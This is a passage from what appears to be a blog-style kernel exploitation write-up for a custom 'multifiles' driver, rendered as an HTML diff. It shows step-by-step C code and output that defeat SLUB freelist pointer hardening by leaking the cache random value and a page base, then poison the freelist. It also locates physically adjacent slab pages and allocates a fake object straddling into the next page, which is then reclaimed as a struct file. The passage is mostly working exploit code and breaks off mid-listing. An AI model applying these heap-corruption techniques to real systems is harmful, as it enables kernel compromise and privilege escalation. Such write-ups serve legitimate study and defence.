+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">freeptr_t</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">freeptr_addr</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">freelist_ptr_encode</span>(<span style="color:#e06c75">s</span>, <span style="color:#e06c75">fp</span>, <span style="color:#e06c75">freeptr_addr</span>);
+</span></span></code></pre></div><p><code>s-&gt;offset</code> is <code>0x50</code> for our cache, <code>swab</code> on a 64-bit value is <code>bswap64</code>, so for an object at base <code>O</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span>E<span style="color:#56b6c2">(</span>O<span style="color:#56b6c2">)</span> <span style="color:#56b6c2">=</span> next<span style="color:#56b6c2">(</span>O<span style="color:#56b6c2">)</span> ^ s-&gt;random ^ bswap64<span style="color:#56b6c2">(</span>O + 0x50<span style="color:#56b6c2">)</span>
+</span></span></code></pre></div><p>One word is one equation in three unknowns — <code>next</code>, <code>s-&gt;random</code>, and <code>O</code> (which hides the unknown page base). We kill two of them with two XOR cancellations.</p>
+<h4 id="two-cancellations">Two cancellations</h4>
+<ol>
+<li><strong>XOR two words to cancel <code>random</code>.</strong> It&rsquo;s one per-cache constant, so <code>E(A) ^ E(B)</code> drops it.</li>
+<li><strong>Same-page bswap cancels the page base.</strong> <code>bswap64(a) ^ bswap64(b) = bswap64(a ^ b)</code>, and for two freeptr slots on the same 4K page <code>a ^ b</code> is just the low-bits <em>delta</em> — the page base is identical in both and cancels. We don&rsquo;t know the address, but we know the <em>&ldquo;distance&rdquo;</em>.</li>
+</ol>
+<h4 id="layout">Layout</h4>
+<p><code>0x1000 / 0xa0 = 25</code> objects per page (<code>0x60</code> tail padding). On a pristine page allocations climb by address, so <code>O_i = page + i*0xa0</code>. We use three of them:</p>
+<pre tabindex="0"><code>O_20 = page+0xc80   slot page+0xcd0
+O_22 = page+0xdc0   slot page+0xe10
+O_24 = page+0xf00   slot page+0xf50   (last object on the page)
+</code></pre><p>To read <code>E(O_i)</code> we OOB-read from its <em>live</em> left neighbor <code>O_{i-1}</code> (<code>f_pos=0x98</code>, word at <code>leak+0x38</code>), so we keep odd indices alive and free even ones. Fill the page completely, then free <code>24, 22, 20</code> in that order — the per-cpu freelist is LIFO and a full page starts with an empty freelist, so:</p>
+<pre tabindex="0"><code>free 24:  next(O_24) = NULL
+free 22:  next(O_22) = O_24
+free 20:  next(O_20) = O_22
+</code></pre><h4 id="recovering-page-base-and-random">Recovering page base and random</h4>
+<p><code>slot24 ^ slot22 = 0xf50 ^ 0xe10 = 0x140</code>, and <code>bswap64(0x140) = 0x4001000000000000</code>. With <code>e24/e22/e20</code> read from <code>O_23/O_21/O_19</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#7f848e">// e24 = NULL ^ R ^ bsw(page+0xf50)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#7f848e">// e22 = O_24 ^ R ^ bsw(page+0xe10)   (O_24 = page+0xf00)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">O24</span>    <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e22</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">e24</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x4001000000000000ULL</span>; <span style="color:#7f848e">// R and page base both cancel
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">page</span>   <span style="color:#56b6c2">=</span> <span style="color:#e06c75">O24</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xf00</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">random</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e24</span> <span style="color:#56b6c2">^</span> <span style="color:#61afef;font-weight:bold">bsw</span>(<span style="color:#e06c75">page</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xf50</span>);           <span style="color:#7f848e">// e24 = R ^ bsw(slot24)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">7</span><span><span style="color:#7f848e">// cross-check: decode O_20 -&gt; next must be O_22
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">8</span><span><span style="color:#c678dd">if</span> ((<span style="color:#e06c75">e20</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">random</span> <span style="color:#56b6c2">^</span> <span style="color:#61afef;font-weight:bold">bsw</span>(<span style="color:#e06c75">page</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xcd0</span>)) <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">page</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xdc0</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">9</span><span>    <span style="color:#61afef;font-weight:bold">die</span>(<span style="color:#98c379">&#34;decode cross-check failed&#34;</span>);
+</span></span></code></pre></div><p>Running it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#56b6c2">[</span>~<span style="color:#56b6c2">]</span> decode
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> <span style="color:#e06c75">page_base</span>    <span style="color:#56b6c2">=</span> 0xffffa30441994000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> <span style="color:#e06c75">cache_random</span> <span style="color:#56b6c2">=</span> 0x0f2dff77be715bcc
+</span></span></code></pre></div><p><code>page_base</code> is <code>0x1000</code>-aligned and lands in the direct map — but note it is <strong>not</strong> the textbook <code>0xffff8880...</code>; this kernel has direct-map KASLR, which is exactly why we never hardcode a base and validate with the cross-check (<code>next(O_20) == O_22</code>) instead. With <code>s-&gt;random</code> in hand the encoding is fully invertible: we can decode any freelist word, and — more usefully — <code>forge</code> one as <code>target ^ random ^ bswap64(&amp;slot)</code>.</p>
+<blockquote>
+<p><strong>Practical note.</strong> The 25-object fill must land on a pristine page for <code>O_i = page + i*0xa0</code> to hold, so in the exploit <code>decode</code> runs first on a dedicated fd, before any other <code>CREATE</code>, and refills the three freed slots afterwards so the later stages start on a clean page.</p>
+</blockquote>
+<h3 id="poisoning-the-freelist">Poisoning the freelist</h3>
+<p>With <code>s-&gt;random</code> and a heap base we can run the encoding <em>backwards</em>: to make slot <code>S</code> hold an encoded pointer to <code>target</code>, write <code>target ^ random ^ bswap64(S)</code>. The plan is to overwrite a <em>freed</em> object&rsquo;s <code>+0x50</code> so the freelist leads to an address we picked — then two <code>CREATE</code>s hand it back as a fresh <code>MultiFile</code>.</p>
+<p><strong>Target.</strong> <code>page + 0xfc0</code>. A <code>0xa0</code> object placed there spans <code>[page+0xfc0, page+0x1060)</code> — the last <code>0x40</code> bytes of this page plus the first <code>0x60</code> of the <em>next physical page</em>. <code>0xfc0</code> sits in the page&rsquo;s tail padding, and the object&rsquo;s start is still on a multifiles page, so the membership check and hardened usercopy both stay happy. That straddle is what later becomes a cross-page primitive.</p>
+<p><strong>Where we poison.</strong> The freed object <code>F</code> has to be the current cpu-slab freelist head <em>and</em> at a known address. <code>page0</code> from the leak fits both: right after <code>decode</code> it is full and still the cpu slab, and <code>F = page + 12*0xa0</code> (slot <code>0x7d0</code>) has a known address. Freeing it pushes it to the cpu freelist with <code>F-&gt;next == NULL</code>.</p>
+<p><strong>Writing <code>+0x50</code>.</strong> Same window as the read, other direction: from the live left neighbor <code>F-1</code> at <code>f_pos=0x98</code> the copy lands on <code>F[0x18, 0x58)</code>, so we read it, splice the forged word in at <code>leak+0x38</code>, and write it back.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#e5c07b">uint32_t</span> <span style="color:#e06c75">F</span>      <span style="color:#56b6c2">=</span> <span style="color:#d19a66">12</span>;                     <span style="color:#7f848e">// F = page + 12*0xa0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">F_slot</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">page</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">12</span><span style="color:#56b6c2">*</span><span style="color:#d19a66">0xa0</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x50</span>;  <span style="color:#7f848e">// page+0x7d0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">target</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">page</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xfc0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span><span style="color:#61afef;font-weight:bold">mf_delete</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">F</span>);                         <span style="color:#7f848e">// F -&gt; cpu freelist head, F-&gt;next == NULL
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">enc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">target</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">random</span> <span style="color:#56b6c2">^</span> <span style="color:#61afef;font-weight:bold">bsw</span>(<span style="color:#e06c75">F_slot</span>);   <span style="color:#7f848e">// forge
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#61afef;font-weight:bold">mf_read</span> (<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">F</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span><span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#e06c75">leak</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x38</span>, <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">enc</span>, <span style="color:#d19a66">8</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span><span style="color:#61afef;font-weight:bold">mf_write</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">F</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span><span style="color:#7f848e">// read it back and decode -&gt; must equal target
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span><span style="color:#61afef;font-weight:bold">mf_read</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">F</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span><span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">enc</span>, <span style="color:#e06c75">leak</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x38</span>, <span style="color:#d19a66">8</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">decoded</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">enc</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">random</span> <span style="color:#56b6c2">^</span> <span style="color:#61afef;font-weight:bold">bsw</span>(<span style="color:#e06c75">F_slot</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#56b6c2">[</span>~<span style="color:#56b6c2">]</span> poison
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> F+0x50 decodes to 0xffff896f419bafc0 <span style="color:#56b6c2">(</span>target 0xffff896f419bafc0<span style="color:#56b6c2">)</span>
+</span></span></code></pre></div><p>The freelist now reads <code>F -&gt; page+0xfc0</code>: the next <code>CREATE</code> pops <code>F</code>, and the one after pops <code>page+0xfc0</code>. We stop one step short of actually allocating it — popping <code>page+0xfc0</code> sets the cpu freelist head to whatever garbage sits at <code>*(page+0x1010)</code>, so doing it is a one-way door. Instead we re-encode <code>NULL</code> back into <code>F+0x50</code> and consume <code>F</code>, leaving <code>page0</code> full and the cache clean. The next step is to make sure that straddle reaches a page we actually own.</p>
+<h3 id="finding-contiguous-pages">Finding contiguous pages</h3>
+<p>Allocating the fake object isn&rsquo;t free: <code>CREATE</code> uses <code>kmem_cache_zalloc</code>, which zeroes <code>0xa0</code> bytes from <code>page+0xfc0</code> — and <code>0x60</code> of those land in the <em>next physical page</em>. We then read and write that straddle window. So the page at <code>page+0x1000</code> can&rsquo;t be arbitrary kernel memory; it has to be a slab page we own, or we corrupt something random and (best case) panic. So before allocating anything at a page tail we first locate a pair of <strong>physically adjacent</strong> multifiles pages <code>A, B</code> with <code>B == A + 0x1000</code>.</p>
+<p><code>cache_random</code> makes this cheap. The base of any <em>full</em> page falls out of a single NULL-terminated freeptr: free the page&rsquo;s last object (<code>pos24</code>, at <code>base+0xf00</code>) and its <code>next</code> becomes <code>NULL</code>, so the encoded word is just <code>random ^ bswap64(base+0xf50)</code>. Read it through the live <code>pos23</code> and invert:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#7f848e">// free pos24 -&gt; next == NULL; read its freeptr via the live pos23
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#61afef;font-weight:bold">mf_delete</span>(<span style="color:#e06c75">fds</span>[<span style="color:#e06c75">last</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">PERFD</span>], <span style="color:#e06c75">last</span><span style="color:#56b6c2">%</span><span style="color:#e06c75">PERFD</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#61afef;font-weight:bold">mf_read</span> (<span style="color:#e06c75">fds</span>[<span style="color:#e06c75">prev</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">PERFD</span>], <span style="color:#e06c75">prev</span><span style="color:#56b6c2">%</span><span style="color:#e06c75">PERFD</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span><span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">enc</span>, <span style="color:#e06c75">leak</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x38</span>, <span style="color:#d19a66">8</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">base</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">bsw</span>(<span style="color:#e06c75">enc</span> <span style="color:#56b6c2">^</span> <span style="color:#e06c75">random</span>) <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0xf50</span>;   <span style="color:#7f848e">// pos24+0x50 = bsw(enc^random)
+</span></span></span></code></pre></div><p>Right after <code>decode</code>/<code>poison</code> the cache holds nothing but the full <code>page0</code>, so a plain sequential spray lays down fresh pages <code>page1, page2, …</code> in allocation order — object <code>gi</code> sits at <code>scan_page(gi/25) + (gi%25)*0xa0</code>. We spray <code>SCAN_PAGES</code> of them, decode every base, and look for <code>B == A + 0x1000</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#56b6c2">[</span>~<span style="color:#56b6c2">]</span> root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> <span style="color:#e06c75">A</span><span style="color:#56b6c2">=</span>0xffff9de3419c2000  <span style="color:#e06c75">B</span><span style="color:#56b6c2">=</span>0xffff9de3419c3000
+</span></span></code></pre></div><p>The buddy allocator hands out order-0 pages from contiguous runs often enough that a few dozen are almost always enough to contain an adjacent pair. <code>A</code> is the page whose tail object we&rsquo;ll poison; <code>B</code> is the page the fake object reaches into.</p>
+<h3 id="allocating-the-fake-object">Allocating the fake object</h3>
+<p>There&rsquo;s a snag: <code>A</code> is <em>not</em> the cpu slab. The buddy allocator handed pages out in ascending order, so by the time <code>B</code> exists <code>A</code> is already a deactivated full slab, and a plain <code>CREATE</code> won&rsquo;t touch it. SLUB&rsquo;s per-cpu partial list fixes that: freeing <code>A</code>&rsquo;s tail object turns <code>A</code> partial, and once the current cpu slab runs dry the allocator pulls <code>A</code> back and starts handing out its objects again. So we free <code>pos24</code>, forge its <code>next</code> to <code>A+0xfc0</code>, and <code>CREATE</code> twice — the first pops <code>pos24</code>, the second pops <code>A+0xfc0</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#61afef;font-weight:bold">mf_delete</span>(<span style="color:#e06c75">fds</span>[<span style="color:#e06c75">last</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">PERFD</span>], <span style="color:#e06c75">last</span><span style="color:#56b6c2">%</span><span style="color:#e06c75">PERFD</span>);                 <span style="color:#7f848e">// free A&#39;s tail
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#e5c07b">uint64_t</span> <span style="color:#e06c75">enc</span> <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">A</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xfc0</span>) <span style="color:#56b6c2">^</span> <span style="color:#e06c75">random</span> <span style="color:#56b6c2">^</span> <span style="color:#61afef;font-weight:bold">bsw</span>(<span style="color:#e06c75">A</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xf50</span>);   <span style="color:#7f848e">// forge pos24-&gt;next
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#61afef;font-weight:bold">mf_read</span> (<span style="color:#e06c75">fds</span>[<span style="color:#e06c75">prev</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">PERFD</span>], <span style="color:#e06c75">prev</span><span style="color:#56b6c2">%</span><span style="color:#e06c75">PERFD</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span><span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#e06c75">leak</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x38</span>, <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">enc</span>, <span style="color:#d19a66">8</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span><span style="color:#61afef;font-weight:bold">mf_write</span>(<span style="color:#e06c75">fds</span>[<span style="color:#e06c75">prev</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">PERFD</span>], <span style="color:#e06c75">prev</span><span style="color:#56b6c2">%</span><span style="color:#e06c75">PERFD</span>, <span style="color:#d19a66">0x98</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">7</span><span><span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fds</span>[<span style="color:#e06c75">last</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">PERFD</span>], <span style="color:#98c379">&#34;reB&#34;</span>);        <span style="color:#7f848e">// pops pos24
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">8</span><span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">fake</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fake_store</span>, <span style="color:#98c379">&#34;pad&#34;</span>);  <span style="color:#7f848e">// pops A+0xfc0 -&gt; the fake object
+</span></span></span></code></pre></div><p><code>fake</code> is a perfectly legal <code>MultiFile</code> whose body runs off the end of <code>A</code>. Its <code>data</code> starts at <code>A+0xfe0</code>, so <code>data[4]</code> is <code>A+0x1000 = B+0</code> — the first object on the next page. There&rsquo;s one rule for using it: the copy has to <em>start</em> on <code>A</code>, or the membership check trips. <code>f_pos=0x1f</code> puts the base at <code>A+0xfff</code> (the last byte of <code>A</code>) and spills the following <code>0x40</code> bytes into <code>B</code>, so every <code>B</code> field comes back at <code>buf[1 + offset]</code> — a one-byte shift we just carry around.</p>
+<p>That&rsquo;s the primitive: a controlled read/write into the physical page right after <code>A</code>. Now we make that page hold something worth corrupting.</p>
+<h3 id="reclaiming-b-as-a-struct-file">Reclaiming B as a struct file</h3>
+<p><code>B</code> is full of our <code>MultiFile</code>s. To hand its page to another cache we drain it back to the buddy allocator and lean on SLUB&rsquo;s discard policy. With <code>CONFIG_SLUB_CPU_PARTIAL</code> the per-cpu partial list holds ~10 slabs and the node keeps <code>min_partial = 5</code> empties; past that, freeing an empty slab discards its page to buddy. So we turn a batch of full pages into empties — 11 to warm the cpu-partial chain, then <code>B</code> plus 9 more to push the discard through:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#c678dd">for</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">WARMUP_EMPTY_PAGES</span>; <span style="color:#e06c75">i</span><span style="color:#56b6c2">++</span>) <span style="color:#61afef;font-weight:bold">free_full_page</span>(<span style="color:#e06c75">fds</span>, <span style="color:#e06c75">press</span>[<span style="color:#e06c75">i</span>]);       <span style="color:#7f848e">// 11
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#61afef;font-weight:bold">free_full_page</span>(<span style="color:#e06c75">fds</span>, <span style="color:#e06c75">bp</span>);                                                      <span style="color:#7f848e">// B
